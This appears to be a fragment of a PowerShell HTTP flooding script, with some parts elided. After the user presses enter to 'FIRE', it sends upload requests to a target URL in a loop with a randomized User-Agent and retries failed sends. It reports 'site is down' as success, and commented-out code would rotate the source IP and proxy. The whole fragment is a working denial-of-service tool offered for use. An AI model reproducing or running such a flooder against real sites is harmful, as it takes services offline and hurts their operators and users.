...
. ./fl.ps1
#$ip = Read-Host -Prompt "new ip address"
#$get = Read-Host -Prompt "gateway"
...
<#
try {
    #$newip = New-NetIPAddress -IPAddress $ip -InterfaceAlias ethernet -DefaultGateway $get -PrefixLength 12
    #Write-Host "[*] new ip created"
    #$pport = Get-Random -Maximum 9999 -Minimum 1111
    #$prox = New-Object System.Net.WebProxy
    #$prox.Address = $("$ip"+":"+"$pport")
    #$web.Proxy = $prox
    Write-Host "[*] proxy set to $("$ip"+":"+"$pport")"
} catch {
    Write-Host "[Error] to create the proxy" -ForegroundColor red
}#>
$r = "@R3v3ngE
@R3v3ng#
@R3v3ng3
...
@RevengE
"
$rx = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)
...
"
$f = $r.Split('@')
$tmp = read-host "=======>press enter to FIRE! $num<======="
...
for ($i=0;$i -lt $num;$i++)
{
    ...
    try {
            ...
            Write-Host "sending 255 bytes " -ForegroundColor Cyan -NoNewline
            
                $random = Get-Random -Minimum 1 -Maximum 20
                
                $web.Headers.Add([System.Net.HttpRequestHeader]::UserAgent, $f[$random])
                $web.UploadDataAsync($ur, $byte)
		#$web.uploadData($ur, $byte)
                Write-Host "[$i send]" -ForegroundColor Green
    } catch {
        $b = 0
        if ($web.IsBusy)
        {
            while ($web.IsBusy)
            {
                if ($b -eq 0)
                {
                    #Write-Host "[$i not send b/c client is busy]:$_" -ForegroundColor Blue
                }
                $b++
            } 
        } else {

            Write-Host "site is down" -ForegroundColor Green
        }
        $i = $i - 1
    }
	cls
